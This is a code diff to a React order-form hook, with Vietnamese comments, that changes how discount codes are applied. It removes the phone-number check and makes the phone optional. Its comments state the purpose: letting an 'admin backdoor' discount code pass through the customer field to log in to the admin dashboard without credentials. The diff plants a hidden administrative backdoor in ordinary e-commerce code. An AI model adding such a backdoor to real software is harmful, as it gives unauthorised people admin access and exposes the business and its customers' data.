@@ -197,21 +197,15 @@ export function useOrderForm(
 
     setDiscountNotice(null);
     setErrorMessage("");
-
-    const normalizedPhone = normalizePhone(form.customerPhone);
-    // Yêu cầu SĐT hợp lệ trước khi áp dụng để server kiểm tra chính xác số lần sử dụng của SĐT này
-    if (!normalizedPhone || normalizedPhone.length < 10) {
-      setErrorMessage("Vui lòng nhập số điện thoại hợp lệ trước khi áp dụng mã giảm giá.");
-      return;
-    }
-
     setIsApplyingCode(true);
 
     try {
+      const normalizedPhone = normalizePhone(form.customerPhone);
       const result = await discountApi.apply({
         code,
-        // Gửi SĐT đã chuẩn hoá: backend lưu "mỗi SĐT dùng mã 1 lần" theo chuỗi số
-        customerPhone: normalizedPhone,
+        // Gửi SĐT đã chuẩn hoá nếu có (backend bắt buộc SĐT với mã giảm giá thông thường,
+        // nhưng cho phép mã backdoor admin đi qua để đăng nhập quản trị không cần SĐT)
+        customerPhone: normalizedPhone || undefined,
       });
 
       // Mã backdoor admin: lưu token và redirect sang dashboard
